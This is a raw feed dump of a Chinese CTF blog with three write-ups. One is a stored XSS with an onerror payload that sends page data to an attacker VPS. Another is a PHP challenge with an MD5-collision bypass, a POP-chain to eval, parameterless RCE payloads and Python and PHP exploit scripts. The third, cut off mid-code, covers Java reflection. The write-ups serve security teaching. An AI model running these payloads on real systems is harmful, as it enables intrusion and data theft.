&amp;lt;</span>        q<span class="token punctuation">.</span>answer<span class="token operator">=</span>q<span class="token punctuation">.</span>answer<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/&lt;/g</span><span class="token punctuation">,</span><span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// 这是后端的逻辑,并不重要hhh</span>        <span class="token keyword">const</span> askee<span class="token operator">=</span><span class="token keyword">await</span> usersDB<span class="token punctuation">.</span><span class="token function">findOne</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'userId'</span><span class="token punctuation">:</span>q<span class="token punctuation">.</span>askeeId<span class="token punctuation">}</span><span class="token punctuation">)</span>        q<span class="token punctuation">.</span>askeeName<span class="token operator">=</span>askee<span class="token punctuation">.</span>username    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><code>password</code>处过滤了<code>&lt;</code>，所以考虑在answer处实现<code>&lt;</code><br>利用img标签，在username处<code>&lt;img a='</code>，在answer处<code>' src="http://kingkb.top/" onerror="console.log(2)"&gt;</code>，尝试后发现成功，然后想办法取出html中的用户名<code>document.getElementsByClassName('outer')[0].firstElementChild.firstChild.data</code>，然后外带到服务器上，最后的payload为<br><code>' src="http://kingkb.top/" onerror="window.location.href = 'http://vps:port?flag=' + document.getElementsByClassName('outer')[0].firstElementChild.firstChild.data"&gt;</code></p><p>vps监听得到<code>/?flag=TSCTF-J{Hope_we_meet_the_ones}%20%E7%9A%84%E6%8F%90%E9%97%AE</code>，得到flag:TSCTF-J{Hope_we_meet_the_ones}。</p><h2 id="UrlShorten"><a href="#UrlShorten" class="headerlink" title="UrlShorten"></a>UrlShorten</h2><p>出题人的恶趣味，让找issue：<a href="https://github.com/serde-rs/serde/issues/1587"> Struct with named fields can be deserialized from sequence #1587 </a>。<br>随便注册一个用户后登陆，尝试输入一个长链接缩短，报错<br><img src="https://kingofkb.github.io/medias/image/20221022/erroraccess.png"><br>全局搜索找到报错信息所在位置</p><pre class=" language-rust"><code class="language-rust"><span class="token keyword">if</span> <span class="token operator">!</span>user<span class="token punctuation">.</span>access <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">Err</span><span class="token punctuation">(</span>AppError<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token string">"You can't short url at present"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里是对user.access的值进行判断，搜索值。<br>找到struct定义处</p><pre class=" language-rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">struct</span> User <span class="token punctuation">{</span>    <span class="token keyword">pub</span> name<span class="token punctuation">:</span> String<span class="token punctuation">,</span>    <span class="token keyword">pub</span> password<span class="token punctuation">:</span> String<span class="token punctuation">,</span>    <span class="token attribute attr-name">#[serde(default)]</span>    <span class="token keyword">pub</span> access<span class="token punctuation">:</span> bool<span class="token punctuation">,</span><span class="token punctuation">}</span></code></pre><p>再看一下register处</p><pre class=" language-rust"><code class="language-rust"><span class="token keyword">pub</span> async <span class="token keyword">fn</span> <span class="token function">register_post</span><span class="token punctuation">(</span><span class="token function">Json</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">:</span> Json<span class="token operator">&lt;</span>serde_json<span class="token punctuation">:</span><span class="token punctuation">:</span>Value<span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">-></span> HandlerHeaderResult <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token operator">!</span>utils<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">validate_body</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>body<span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">Err</span><span class="token punctuation">(</span><span class="token function">er_safe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> user<span class="token punctuation">:</span> User <span class="token operator">=</span> <span class="token keyword">match</span> serde_json<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">from_value</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">Ok</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> user<span class="token punctuation">,</span>        <span class="token function">Err</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">Err</span><span class="token punctuation">(</span><span class="token function">user_register_failed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> user<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">5</span> <span class="token operator">||</span> user<span class="token punctuation">.</span>password<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">7</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">Err</span><span class="token punctuation">(</span><span class="token function">too_short</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> USER<span class="token punctuation">.</span><span class="token function">contains_key</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>user<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">Err</span><span class="token punctuation">(</span><span class="token function">user_already_exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    user<span class="token punctuation">.</span>password <span class="token operator">=</span> utils<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">sha256</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> username <span class="token operator">=</span> user<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> session_cookie <span class="token operator">=</span> uuid<span class="token punctuation">:</span><span class="token punctuation">:</span>Uuid<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">new_v4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    SESSIONS<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>session_cookie<span class="token punctuation">,</span> username<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    USER<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> headers <span class="token operator">=</span> HeaderMap<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span>StatusCode<span class="token punctuation">:</span><span class="token punctuation">:</span>OK<span class="token punctuation">,</span> headers<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>其中<code>validate_body</code>函数是这样定义的</p><pre class=" language-rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function">validate_body</span><span class="token punctuation">(</span>body<span class="token punctuation">:</span> <span class="token operator">&amp;</span>serde_json<span class="token punctuation">:</span><span class="token punctuation">:</span>Value<span class="token punctuation">,</span> allowed<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token operator">&amp;</span>str<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> bool <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token function">Some</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span> <span class="token operator">=</span> body<span class="token punctuation">.</span><span class="token function">as_object</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> body<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">any</span><span class="token punctuation">(</span><span class="token operator">|</span>key<span class="token operator">|</span> <span class="token operator">!</span>allowed<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>key<span class="token punctuation">.</span><span class="token function">as_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">true</span><span class="token punctuation">}</span></code></pre><p>后面暂时先摆了，一方面没接触过rust语法，另一方面也好长时间没看过sql注入的题目了，还剩一道ezja等完了java系列的再熟悉熟悉就来复现。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-文件上传 ctf-模板注入 ctf-xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TSCTF-J 2022 can can need picture题解以及出题感悟</title>
      <link href="/2022/10/18/can%20can%20need%20picture/"/>
      <url>/2022/10/18/can%20can%20need%20picture/</url>
      
        <content type="html"><![CDATA[<h1 id="TSCTF-J-2022-can-can-need-picture题解以及出题感悟"><a href="#TSCTF-J-2022-can-can-need-picture题解以及出题感悟" class="headerlink" title="TSCTF-J 2022 can can need picture题解以及出题感悟"></a>TSCTF-J 2022 can can need picture题解以及出题感悟</h1><h2 id="纪第一次出题"><a href="#纪第一次出题" class="headerlink" title="纪第一次出题"></a>纪第一次出题</h2><p>恭喜TSCTF-J2022圆满结束，这是我学ctf以来第一次出题，遇到了各种各样的问题。第一版是杂糅了诸多考点（无参数RCE，pop链，文件包含等），但限于代码技术，还没有实现就夭折了。第二版与最终版比较类似，只不过我想通过无参RCE获得hint，然后通过curl去获取flag，但权限的设置一直没搞好，这一版也就夭折了。然后就是现在的最终版，感觉效果也还不错，有很多解，也有很多师傅来找我交流，希望给大家带来了比较不错的体验。<br><img src="https://kingofkb.github.io/medias/image/20221018/challenge.png"><br><img src="https://kingofkb.github.io/medias/image/20221018/solved.png"></p><h2 id="can-can-need-picture题解部分"><a href="#can-can-need-picture题解部分" class="headerlink" title="can can need picture题解部分"></a>can can need picture题解部分</h2><p>打开题目，看见url，<code>/index.php?f=YUhSMGNITTZMeTloY0drdWJYUjVjWGd1WTI0dmRHRndhUzl5WVc1a2IyMHVjR2h3</code><br>发现传参f，f中传的值很明显是<code>base64</code>加密的，尝试解密（base64两次）得到<code>https://api.mtyqx.cn/tapi/random.php</code>。<br>尝试随便输入一个值，返回<code>Warning: file_get_contents(): Filename cannot be empty in /var/www/html/index.php on line 14</code>，<code>file_get_contents()</code>函数是可以用来获取本地文件的。<br>尝试获取<code>index.php</code>，<code>base64</code>加密两次，得到<code>YVc1a1pYZ3VjR2h3</code>，传入，发现得到提示<code>no,you can't see this.can can class.php and hack.php.</code>，尝试读取这两个文件。<br>class.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">apple</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$m1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">.</span><span class="token string">"1!5!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">m1</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">banana</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$v1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$function</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token punctuation">;</span>        <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">v1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">hack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">find</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">)</span>             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/et|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>hack.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"class.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"die"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>         <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"nonono!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>很明显是一个pop链，pop链为<code>apple:__wakeup -&gt; banana:__tostring -&gt; banana:__invoke -&gt; apple:__call -&gt; find:__get -&gt; find:backdoor</code>。<br>但首先需要绕过MD5，这个payload网上很好找到，我贴到这</p><pre class=" language-1"><code class="language-1">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</code></pre><p>然后就可以到达backdoor部分，看过滤函数很容易发现这是一道无参数RCE的问题，但是get被ban掉了，想办法绕过，这时候选择localeconv()函数加scandir()函数绕过，我们知道scandir()可以列出当前目录，同时，localeconv()的第一位必定是，利用current取出，构造<code>var_dump(scandir(current(localeconv())))</code>，可以看到当前目录下有四个文件，其中有一个是<code>hint.php</code>，想办法读取。构造<code>show_source(next(array_reverse(scandir(current(localeconv())))));</code>即可看到hint.php代码，里面告诉我们flag在根目录。<br><img src="https://kingofkb.github.io/medias/image/20221018/hint.png"><br>接下来就是想办法构造/，网上有很多现成payload，我参考的就是这个<a href="https://blog.csdn.net/weixin_28759987/article/details/116284686">php无参数函数实现rce,无参数读文件和RCE总结</a>，最后的payload为<code>show_source(current(array_reverse(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array())))))))))));</code>，这个结果输出有三种可能，要多尝试两次，可以得到flag。<br>我把最后的脚本贴到这</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">apple</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$m1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">banana</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$v1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">find</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$code</span><span class="token operator">=</span><span class="token string">"show_source(current(array_reverse(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array())))))))))));"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));</span>    <span class="token comment" spellcheck="true">//show_source(next(array_reverse(scandir(current(localeconv())))));</span>    <span class="token comment" spellcheck="true">//show_source(current(array_reverse(scandir(chr(ord(strrev(crypt(serialize(array())))))))));</span><span class="token punctuation">}</span><span class="token variable">$f</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">apple</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a2</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">apple</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">banana</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b2</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">banana</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a2</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">m1</span><span class="token operator">=</span><span class="token variable">$f</span><span class="token punctuation">;</span><span class="token variable">$b2</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">v1</span><span class="token operator">=</span><span class="token variable">$a2</span><span class="token punctuation">;</span><span class="token variable">$b1</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">=</span><span class="token variable">$b2</span><span class="token punctuation">;</span><span class="token variable">$a1</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token operator">=</span><span class="token variable">$b1</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://8.141.150.150:11233/hack.php"</span>a<span class="token operator">=</span><span class="token string">"M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2"</span><span class="token punctuation">;</span>b<span class="token operator">=</span><span class="token string">"M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2"</span><span class="token punctuation">;</span>r1<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">"http://localhost/ezphp/exp3.php"</span><span class="token punctuation">)</span>pop<span class="token operator">=</span>str<span class="token punctuation">(</span>r1<span class="token punctuation">.</span>text<span class="token punctuation">)</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"?a="</span><span class="token operator">+</span>a<span class="token operator">+</span><span class="token string">"&amp;b="</span><span class="token operator">+</span>b<span class="token operator">+</span><span class="token string">"&amp;pop="</span><span class="token operator">+</span>pop<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"?a="</span><span class="token operator">+</span>a<span class="token operator">+</span><span class="token string">"&amp;b="</span><span class="token operator">+</span>b<span class="token operator">+</span><span class="token string">"&amp;pop="</span><span class="token operator">+</span>pop<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p>得到flag<br><img src="https://kingofkb.github.io/medias/image/20221018/flag.png"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pop链 无参数RCE 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java CommonsCollections2链学习</title>
      <link href="/2022/09/02/Java%20CommonsCollections2%E9%93%BE%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/09/02/Java%20CommonsCollections2%E9%93%BE%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-CommonsCollections2链学习"><a href="#Java-CommonsCollections2链学习" class="headerlink" title="Java CommonsCollections2链学习"></a>Java CommonsCollections2链学习</h1><h2 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h2><p><a href="https://blog.csdn.net/qq_44715943/article/details/120587716">Java反射</a></p><h3 id="反射机制相关的重要的类"><a href="#反射机制相关的重要的类" class="headerlink" title="反射机制相关的重要的类"></a>反射机制相关的重要的类</h3><pre class=" language-1"><code class="language-1">java.lang.Class:代表整个字节码。代表一个类型，代表整个类。java.lang.reflect.Method:代表字节码中的方法字节码。代表类中的方法。java.lang.reflect.Constructor:代表字节码中的构造方法字节码。代表类中的构造方法。java.lang.reflect.Field:代表字节码中的属性字节码。代表类中的成员变量（静态变量+实例变量）。</code></pre><p>注：必须先获得Class才能获取Method、Constructor、Field。</p><h3 id="获取class的三种方式"><a href="#获取class的三种方式" class="headerlink" title="获取class的三种方式"></a>获取class的三种方式</h3><p>要操作一个类的字节码，需要首先获取到这个类的字节码，怎么获取java.lang.Class实例？<br>    class.forName()<br>    对象.class<br>    任何类型.class<br>注：以上三种方式返回值都是Class类型。</p><h3 id="通过反射实例化对象"><a href="#通过反射实例化对象" class="headerlink" title="通过反射实例化对象"></a>通过反射实例化对象</h3><pre><code>对象.newInstance</code></pre><p>注：newInstance()方法内部实际上调用了无参数构造方法，必须保证无参构造存在才可以。<br>否则会抛出java.lang.InstantiationException异常。</p><h3 id="反射Filed【反射-反编译一个类的属性】"><a href="#反射Filed【反射-反编译一个类的属性】" class="headerlink" title="反射Filed【反射/反编译一个类的属性】"></a>反射Filed【反射/反编译一个类的属性】</h3><h4 id="Class类方法"><a href="#Class类方法" class="headerlink" title="Class类方法"></a>Class类方法</h4><pre class=" language-1"><code class="language-1">public T newInstance():创建对象public String getName():返回完整类名带包名public String getSimpleName():返回类名public Field[] getFields():返回类中public修饰的属性public Field[] getDeclaredFields():返回类中所有的属性public Field getDeclaredField(String name):根据属性名name获取指定的属性public native int getModifiers():获取属性的修饰符列表,返回的修饰符是一个数字，每个数字是修饰符的代号【一般配合Modifier类的toString(int x)方法使用】public Method[] getDeclaredMethods()    返回类中所有的实例方法public Method getDeclaredMethod(String name, Class<?>… parameterTypes):根据方法名name和方法形参获取指定方法public Constructor<?>[] getDeclaredConstructors():返回类中所有的构造方法public Constructor getDeclaredConstructor(Class<?>… parameterTypes):根据方法形参获取指定的构造方法----    ----public native Class<? super T> getSuperclass():返回调用类的父类public Class<?>[] getInterfaces():返回调用类实现的接口集合</code></pre><h4 id="Field类方法"><a href="#Field类方法" class="headerlink" title="Field类方法"></a>Field类方法</h4><pre class=" language-1"><code class="language-1">public String getName():返回属性名public int getModifiers():获取属性的修饰符列表,返回的修饰符是一个数字，每个数字是修饰符的代号【一般配合Modifier类的toString(int x)方法使用】public Class<?> getType():以Class类型，返回属性类型【一般配合Class类的getSimpleName()方法使用】public void set(Object obj, Object value):设置属性值public Object get(Object obj):读取属性值</code></pre><h4 id="反编译一个类的属性Field"><a href="#反编译一个类的属性Field" class="headerlink" title="反编译一个类的属性Field"></a>反编译一个类的属性Field</h4><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//通过反射机制，反编译一个类的属性Field（了解一下）</span><span class="token keyword">class</span> <span class="token class-name">ReflectTest06</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException <span class="token punctuation">{</span>        StringBuilder s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">studentClass</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span 